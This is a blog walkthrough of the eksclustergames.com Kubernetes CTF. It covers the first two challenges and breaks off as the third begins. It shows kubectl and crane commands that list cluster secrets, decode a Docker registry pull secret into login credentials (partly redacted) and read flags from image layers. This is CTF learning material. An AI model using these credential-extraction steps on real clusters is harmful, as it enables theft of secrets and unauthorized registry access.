<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"/><meta charSet="utf-8"/><link rel="alternate" type="application/rss+xml" title="sontek&#x27;s Engineering Blog" href="/rss.xml"/><title>eksclustergames.com walk through!</title><meta name="next-head-count" content="4"/><link rel="preload" href="/_next/static/css/c9439d4f00292099.css" as="style"/><link rel="stylesheet" href="/_next/static/css/c9439d4f00292099.css" data-n-g=""/><link rel="preload" href="/_next/static/css/e64130af1ba1a327.css" as="style"/><link rel="stylesheet" href="/_next/static/css/e64130af1ba1a327.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-69bfa6990bb9e155.js" defer=""></script><script src="/_next/static/chunks/framework-4556c45dd113b893.js" defer=""></script><script src="/_next/static/chunks/main-2a9c662ddd7329fb.js" defer=""></script><script src="/_next/static/chunks/pages/_app-e535547a4fdaa691.js" defer=""></script><script src="/_next/static/chunks/996-9e3c12b77542c098.js" defer=""></script><script src="/_next/static/chunks/790-a3aa35eb62ec874e.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5B...id%5D-c6e585d86e012327.js" defer=""></script><script src="/_next/static/AoGbC8xlMEkyyIwWs3twS/_buildManifest.js" defer=""></script><script src="/_next/static/AoGbC8xlMEkyyIwWs3twS/_ssgManifest.js" defer=""></script><script src="/_next/static/AoGbC8xlMEkyyIwWs3twS/_middlewareManifest.js" defer=""></script></head><body><div id="__next"><div><div class="grid"><div class="col"><header id="banner" class="body"><h1><a href="/">sontek.net</a></h1></header></div><div class="col menu"><nav><ul><li><a href="/">Home</a></li><li><a href="/blog">Blog</a></li><li><a href="/resume">Resume</a></li><li><a href="/about">About</a></li></ul></nav></div></div><div class="container"><article class="blog_article__NoEy4"><h1 class="util_headingXl__knZ_h">eksclustergames.com walk through!</h1><div class="util_lightText__xcqUE"><time dateTime="2023-11-02T00:00:00Z">November 2, 2023</time></div><div><p><a href="https://eksclustergames.com">eksclustergames.com</a> is a new CTF targetted at
kubernetes vulnerabilities. This is a walk through on how to solve the issues.</p>
<h1>Challenge 1</h1>
<p>The first challenge starts off with a clue:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">Jumpstart your quest by listing all the secrets in the cluster.</span></span>
<span data-line=""><span style="color: #adbac7">Can you spot the flag among them?</span></span></code></pre></div>
<p>So lets start off by getting the secrets:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">secret</span></span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">         </span><span style="color: #96D0FF">TYPE</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">DATA</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">AGE</span></span>
<span data-line=""><span style="color: #F69D50">log-rotate</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">Opaque</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">1</span><span style="color: #ADBAC7">      </span><span style="color: #6CB6FF">37</span><span style="color: #96D0FF">h</span></span></code></pre></div>
<p>Since there is only one, lets view it!</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">secret</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"apiVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"v1",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"items"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">        {</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"apiVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"v1",</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"data"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"flag"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ=="</span></span>
<span data-line=""><span style="color: #ADBAC7">            },</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"kind"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"Secret",</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"metadata"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"creationTimestamp"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-01T13:02:08Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"name"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"log-rotate",</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"namespace"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"challenge1",</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"resourceVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"890951",</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"uid"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"03f6372c-b728-4c5b-ad28-70d5af8d387c"</span></span>
<span data-line=""><span style="color: #ADBAC7">            },</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"type"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"Opaque"</span></span>
<span data-line=""><span style="color: #ADBAC7">        }</span></span>
<span data-line=""><span style="color: #ADBAC7">    ],</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"kind"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"List",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"metadata"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"resourceVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">""</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>The flag seems to be in <code>.items[0].data.flag</code> and is <code>base64</code> encoded so we can
decode it as well:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">secret</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'.items[0].data.flag'</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-r</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">base64</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-d</span></span>
<span data-line=""><span style="color: #F69D50">wiz_eks_challenge</span><span style="color: #ADBAC7">{omg_over_privileged_*REDACTED*}</span></span></code></pre></div>
<p>First flag found!</p>
<p>This one was definitely a softball but it gets you nice and warmed up on the
platform.</p>
<h1>Challenge 2</h1>
<p>The hint for this challenge is:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">A thing we learned during our research: always check the container registries.</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">For your convenience, the crane utility is already pre-installed on the machine.</span></span></code></pre></div>
<p>The first thing I think of when reading this is that it has something to do
with the registry a pod is living on.   So lets list the pods and see what is
available:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">pod</span></span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">                    </span><span style="color: #96D0FF">READY</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">STATUS</span><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">RESTARTS</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">AGE</span></span>
<span data-line=""><span style="color: #F69D50">database-pod-2c9b3a4e</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">1</span><span style="color: #96D0FF">/1</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Running</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">0</span><span style="color: #ADBAC7">          </span><span style="color: #6CB6FF">36</span><span style="color: #96D0FF">h</span></span></code></pre></div>
<p>With only one pod as a target, lets get the image for it:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">pod</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'.items[0].spec.containers[0].image'</span></span>
<span data-line=""><span style="color: #F69D50">"eksclustergames/base_ext_image"</span></span></code></pre></div>
<p>So its on standard <code>docker.io</code> registry instead of a private one like I was
expecting from the clue.   The second hint was that crane is on the system so
lets use that to pull the image and inspect it:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">crane</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">config</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">eksclustergames/base_ext_image</span><span style="color: #ADBAC7"> </span></span>
<span data-line=""><span style="color: #F69D50">Error:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">fetching</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">config:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">reading</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">image</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"eksclustergames/base_ext_image":</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">GET</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">https://index.docker.io/v2/eksclustergames/base_ext_image/manifests/latest:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">UNAUTHORIZED:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">authentication</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">required</span><span style="color: #ADBAC7">; [map[Action:pull Class: Name:eksclustergames/base_ext_image Type:repository]]</span></span></code></pre></div>
<p>Which means this is a private image and we are going to need to get some
credentials to an account that has access to this image. Usually you have to
define a secret for kubernetes to be able to pull from private registries and
since we started off with a secret test first that is where I'm going to go
next:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">pod</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'.items[0].spec.imagePullSecrets'</span></span>
<span data-line=""><span style="color: #ADBAC7">[</span></span>
<span data-line=""><span style="color: #ADBAC7">  {</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">"name"</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"registry-pull-secrets-780bab1d"</span></span>
<span data-line=""><span style="color: #ADBAC7">  }</span></span>
<span data-line=""><span style="color: #ADBAC7">]</span></span></code></pre></div>
<p>So that is the secret we need, lets view it:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">secret</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">registry-pull-secrets-780bab1d</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'.data.".dockerconfigjson"'</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-r</span><span style="color: #F47067">|</span><span style="color: #F69D50">base64</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-d</span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"auths"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"index.docker.io/v1/"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"auth"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"ZWtzY2x1c3RlcmdhbWVzOmRj&#x3C;*REDACTED*>200bHI0NWlZUWo4RnVDbw=="</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">  }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>Looks like we've got some more base64 decoding for the actual auth credentials:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">echo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"ZWtzY2x1c3RdhbWVzOmRj&#x3C;*REDACTED*>200bHI0NWlZ4RnVDbw=="</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">base64</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-d</span></span>
<span data-line=""><span style="color: #F69D50">eksclustergames:dckr&#x3C;*REDACTED*></span></span></code></pre></div>
<p>So now we can login with <code>crane auth</code>:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">crane</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">auth</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">login</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-u</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">eksclustergames</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-p</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">dckr</span><span style="color: #F47067">&#x3C;</span><span style="color: #6CB6FF">*</span><span style="color: #96D0FF">REDACTED</span><span style="color: #F47067">*></span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">docker.io</span></span>
<span data-line=""><span style="color: #F69D50">2023/11/03</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">02</span><span style="color: #96D0FF">:35:49</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">logged</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">in</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">via</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/home/user/.docker/config.json</span></span></code></pre></div>
<p>So if we try to view the image again it should work!</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">crane</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">config</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">eksclustergames/base_ext_image</span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"architecture"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"amd64",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"config"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Env"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span></span>
<span data-line=""><span style="color: #ADBAC7">    ],</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Cmd"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"/bin/sleep"</span><span style="color: #F69D50">,</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"3133337"</span></span>
<span data-line=""><span style="color: #ADBAC7">    ],</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"ArgsEscaped"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">true</span><span style="color: #96D0FF">,</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"OnBuild"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">null</span></span>
<span data-line=""><span style="color: #ADBAC7">  },</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-01T13:32:18.920734382Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"history"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">    {</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-07-18T23:19:33.538571854Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created_by"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "</span></span>
<span data-line=""><span style="color: #ADBAC7">    },</span></span>
<span data-line=""><span style="color: #ADBAC7">    {</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-07-18T23:19:33.655005962Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created_by"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"/bin/sh -c #(nop)  CMD [</span><span style="color: #F47067">\"</span><span style="color: #96D0FF">sh</span><span style="color: #F47067">\"</span><span style="color: #96D0FF">]",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"empty_layer"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">true</span></span>
<span data-line=""><span style="color: #ADBAC7">    },</span></span>
<span data-line=""><span style="color: #ADBAC7">    {</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-01T13:32:18.920734382Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created_by"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"RUN sh -c echo 'wiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}' > /flag.txt # buildkit",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"comment"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"buildkit.dockerfile.v0"</span></span>
<span data-line=""><span style="color: #ADBAC7">    },</span></span>
<span data-line=""><span style="color: #ADBAC7">    {</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-01T13:32:18.920734382Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created_by"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"CMD [</span><span style="color: #F47067">\"</span><span style="color: #96D0FF">/bin/sleep</span><span style="color: #F47067">\"</span><span style="color: #96D0FF"> </span><span style="color: #F47067">\"</span><span style="color: #96D0FF">3133337</span><span style="color: #F47067">\"</span><span style="color: #96D0FF">]",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"comment"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"buildkit.dockerfile.v0",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"empty_layer"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">true</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">  ],</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"os"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"linux",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"rootfs"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"type"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"layers",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"diff_ids"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f"</span><span style="color: #F69D50">,</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"sha256:a70cef1cb742e242b33cc21f949af6dc7e59b6ea3ce595c61c179c3be0e5d432"</span></span>
<span data-line=""><span style="color: #ADBAC7">    ]</span></span>
<span data-line=""><span style="color: #ADBAC7">  }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>Looks like they leaked the secret right there in the image layers:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">wiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}'</span></span></code></pre></div>
<p>So lets submit that and move onto the next one!</p>
<h1>Challenge 3</h1>
<p>The hint is:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">A pod's image holds more than just code. Dive deep into its ECR repository,</span></span>
<span data-line=""><span style="color: #adbac7">inspect the image layers, and uncover the hidden secret.</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">Remember: You are running inside a compromised EKS pod.</span></span></code></pre></div>
<p>This sounds very similar to the last one but with the hints that its on ECR and
that we are in the pod itself it makes me believe we'll have something like IRSA
access to AWS from the pod and need to use that to get to it.</p>
<p>First lets check what pods we are working with:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">pod</span></span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">                      </span><span style="color: #96D0FF">READY</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">STATUS</span><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">RESTARTS</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">AGE</span></span>
<span data-line=""><span style="color: #F69D50">accounting-pod-876647f8</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">1</span><span style="color: #96D0FF">/1</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Running</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">0</span><span style="color: #ADBAC7">          </span><span style="color: #6CB6FF">37</span><span style="color: #96D0FF">h</span></span></code></pre></div>
<p>So same as the last challenge, lets get the image and see what access we have:</p>
